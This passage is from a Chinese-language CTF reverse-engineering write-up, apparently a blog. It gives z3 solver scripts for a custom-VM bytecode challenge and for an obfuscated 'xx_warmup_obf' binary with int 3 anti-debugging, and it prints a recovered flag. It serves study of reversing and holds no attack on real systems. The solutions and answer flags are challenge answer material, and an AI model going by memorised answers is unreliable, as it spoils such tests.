class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">point=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    s=Solver()</span><br><span class="line">    var=[BitVec(<span class="string">&#x27;zzz&#x27;</span>,<span class="number">8</span>) ,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    tmp=var[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        op1=opcode[point]</span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x34</span> <span class="keyword">and</span> opcode[point+<span class="number">1</span>]==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x34 0&quot;</span>) </span><br><span class="line">            s.add(var[<span class="number">0</span>] &gt;= <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">            s.add(var[<span class="number">0</span>]&lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x34</span> <span class="keyword">and</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x34 1&quot;</span> ) <span class="comment"># 0x400AD0</span></span><br><span class="line">            var[opcode[point+<span class="number">1</span>]]=opcode[point+<span class="number">2</span>]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3b</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3b&quot;</span> )</span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]+=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]+=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x6e</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x6e&quot;</span>) </span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]^=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]^=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3d</span>:   </span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3d&quot;</span>) </span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]-=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]-=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3a</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3a&quot;</span> )</span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]*=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]*=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x4f</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x4f&quot;</span>) </span><br><span class="line">            s.add(var[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span> (s)</span><br><span class="line">            <span class="built_in">print</span> (s.check())</span><br><span class="line">            result = s.model()</span><br><span class="line">            flag += <span class="built_in">chr</span>(result[tmp].as_long().real)</span><br><span class="line">            <span class="comment">#print flag</span></span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="comment">#raw_input()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            raw_input()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;02a701b714a2746d218c223b1598b0f5&#125;</span></span><br></pre></td></tr></table></figure>

<p>感觉可以试试用pinctf，但是我没成功（可能是环境问题）</p>
<h1 id="2020-re-xx-warmup-obf"><a href="#2020-re-xx-warmup-obf" class="headerlink" title="2020 re xx_warmup_obf"></a>2020 re xx_warmup_obf</h1><p>这题就难在怎么去混淆然后进入验证逻辑分析，二进制里面有很多<code>int 3</code>指令,妨碍调试，运行完后就会进死循环。而且程序很多地方都不能反汇编，所以只能动调试试，遇到<code>int 3</code>指令就跳过，建议使用attach方法直接进入到输入flag的逻辑里面，不然一步步调到输入逻辑太麻烦。</p>
<p><img src="/1763434247558-2.png" alt="img"></p>
<p>比较flag长度的逻辑</p>
<p><img src="/1763434247558-3.png" alt="img"></p>
<p>第一个字符的检验逻辑  <code>flag[0]*5D75 == 253C9E</code> 很容易就能判断该字符为<code>f</code></p>
<p><img src="/1763434247558-4.png" alt="img"></p>
<p>第二个字符检验逻辑<code>flag[1]*44b38 + flag[0]*ffffe83</code>&#x3D;&#x3D; 1c4c7d2 </p>
<p>后面逻辑也差不多，第三个字符检验逻辑就是前三个字符一个方程，第四个就是前四个一个方程，也就是说一共28个方程式。可以把这些方程都罗列出来然后用z3求解。（其实看到这个flag检验逻辑是一个字符一个字符验证的，开始想的是可以直接用pinctf求解，但是尝试了一下只有前三个字符是能正常判断出来的，后面就乱了，可能每个字符验证错误后还需要走一段流程，这个流程比正确流程更长）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = [Int(<span class="string">&quot;flag%d&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">23925</span> ) == <span class="number">2440350</span>)</span><br><span class="line">solver.add( (flag[<span class="number">1</span>]*<span class="number">281400</span> + flag[<span class="number">0</span>]*-<span class="number">7037</span> ) == <span class="number">29673426</span>)</span><br><span class="line">solver.add( (flag[<span class="number">2</span>]*-<span class="number">255300</span> + flag[<span class="number">0</span>]*<span class="number">174826</span> + flag[<span class="number">1</span>]*-<span class="number">283573</span> ) == -<span class="number">37557732</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">276718</span> + flag[<span class="number">1</span>]*-<span class="number">98445</span> + flag[<span class="number">2</span>]*<span class="number">259881</span> + flag[<span class="number">3</span>]*<span class="number">4524</span> ) == -<span class="number">13182867</span>)</span><br><span class="line">solver.add( (flag[<span class="number">4</span>]*-<span class="number">228216</span> + flag[<span class="number">0</span>]*<span class="number">94721</span> + flag[<span class="number">3</span>]*-<span class="number">274569</span> + flag[<span class="number">2</span>]*<span class="number">285576</span> + flag[<span class="number">1</span>]*-<span class="number">60353</span> ) == -<span class="number">25506885</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*<span class="number">125853</span> + flag[<span class="number">2</span>]*<span class="number">264844</span> + flag[<span class="number">4</span>]*-<span class="number">294195</span> + flag[<span class="number">1</span>]*-<span class="number">5496</span> + flag[<span class="number">3</span>]*<span class="number">260927</span> + flag[<span class="number">0</span>]*-<span class="number">153661</span> ) == <span class="number">13075233</span>)</span><br><span class="line">solver.add( (flag[<span class="number">6</span>]*-<span class="number">190371</span> + flag[<span class="number">5</span>]*-<span class="number">130259</span> + flag[<span class="number">2</span>]*-<span class="number">244086</span> + flag[<span class="number">1</span>]*-<span class="number">244952</span> + flag[<span class="number">3</span>]*-<span class="number">258397</span> + flag[<span class="number">0</span>]*<span class="number">17630</span> + flag[<span class="number">4</span>]*-<span class="number">109961</span> ) == -<span class="number">111027477</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">228408</span> + flag[<span class="number">3</span>]*-<span class="number">6727</span> + flag[<span class="number">6</span>]*<span class="number">218992</span> + flag[<span class="number">2</span>]*<span class="number">18513</span> + flag[<span class="number">1</span>]*-<span class="number">198175</span> + flag[<span class="number">7</span>]*<span class="number">268397</span> + flag[<span class="number">5</span>]*<span class="number">117817</span> + flag[<span class="number">4</span>]*<span class="number">224658</span> ) == <span class="number">78775012</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*<span class="number">52068</span> + flag[<span class="number">8</span>]*<span class="number">92684</span> + flag[<span class="number">1</span>]*-<span class="number">84462</span> + flag[<span class="number">4</span>]*<span class="number">190784</span> + flag[<span class="number">2</span>]*<span class="number">77982</span> + flag[<span class="number">0</span>]*-<span class="number">236774</span> + flag[<span class="number">7</span>]*-<span class="number">218493</span> + flag[<span class="number">3</span>]*-<span class="number">288418</span> + flag[<span class="number">6</span>]*-<span class="number">243023</span> ) == -<span class="number">52520267</span>)</span><br><span class="line">solver.add( (flag[<span class="number">1</span>]*-<span class="number">280754</span> + flag[<span class="number">3</span>]*<span class="number">96631</span> + flag[<span class="number">6</span>]*<span class="number">229049</span> + flag[<span class="number">2</span>]*-<span class="number">269632</span> + flag[<span class="number">9</span>]*-<span class="number">39259</span> + flag[<span class="number">4</span>]*<span class="number">171321</span> + flag[<span class="number">5</span>]*-<span class="number">142792</span> + flag[<span class="number">7</span>]*-<span class="number">64473</span> + flag[<span class="number">8</span>]*-<span class="number">196269</span> + flag[<span class="number">0</span>]*-<span class="number">168397</span> ) == -<span class="number">70797046</span>)</span><br><span class="line">solver.add( (flag[<span class="number">6</span>]*<span class="number">121516</span> + flag[<span class="number">5</span>]*-<span class="number">93524</span> + flag[<span class="number">0</span>]*<span class="number">292706</span> + flag[<span class="number">3</span>]*<span class="number">182157</span> + flag[<span class="number">10</span>]*<span class="number">195039</span> + flag[<span class="number">2</span>]*-<span class="number">25900</span> + flag[<span class="number">9</span>]*-<span class="number">32946</span> + flag[<span class="number">1</span>]*-<span class="number">256202</span> + flag[<span class="number">8</span>]*<span class="number">162669</span> + flag[<span class="number">4</span>]*-<span class="number">235026</span> + flag[<span class="number">7</span>]*<span class="number">165207</span> ) == <span class="number">28263339</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">50166</span> + flag[<span class="number">11</span>]*-<span class="number">165434</span> + flag[<span class="number">2</span>]*<span class="number">80519</span> + flag[<span class="number">3</span>]*<span class="number">272791</span> + flag[<span class="number">10</span>]*-<span class="number">4940</span> + flag[<span class="number">5</span>]*-<span class="number">272650</span> + flag[<span class="number">1</span>]*<span class="number">133728</span> + flag[<span class="number">7</span>]*-<span class="number">258188</span> + flag[<span class="number">8</span>]*-<span class="number">111160</span> + flag[<span class="number">9</span>]*-<span class="number">92964</span> + flag[<span class="number">6</span>]*-<span class="number">131770</span> + flag[<span class="number">4</span>]*<span class="number">148713</span> ) == -<span class="number">22025185</span>)</span><br><span class="line">solver.add( (flag[<span class="number">7</span>]*-<span class="number">93199</span> + flag[<span class="number">3</span>]*<span class="number">162962</span> + flag[<span class="number">2</span>]*-<span class="number">214348</span> + flag[<span class="number">0</span>]*<span class="number">20489</span> + flag[<span class="number">8</span>]*-<span class="number">138253</span> + flag[<span class="number">9</span>]*<span class="number">141532</span> + flag[<span class="number">11</span>]*<span class="number">62018</span> + flag[<span class="number">6</span>]*-<span class="number">100280</span> + flag[<span class="number">1</span>]*-<span class="number">184125</span> + flag[<span class="number">12</span>]*<span class="number">71182</span> + flag[<span class="number">10</span>]*<span class="number">9710</span> + flag[<span class="number">4</span>]*-<span class="number">262820</span> + flag[<span class="number">5</span>]*<span class="number">147171</span> ) == -<span class="number">31396844</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">75412</span> + flag[<span class="number">13</span>]*-<span class="number">224754</span> + flag[<span class="number">2</span>]*-<span class="number">119275</span> + flag[<span class="number">9</span>]*-<span class="number">61880</span> + flag[<span 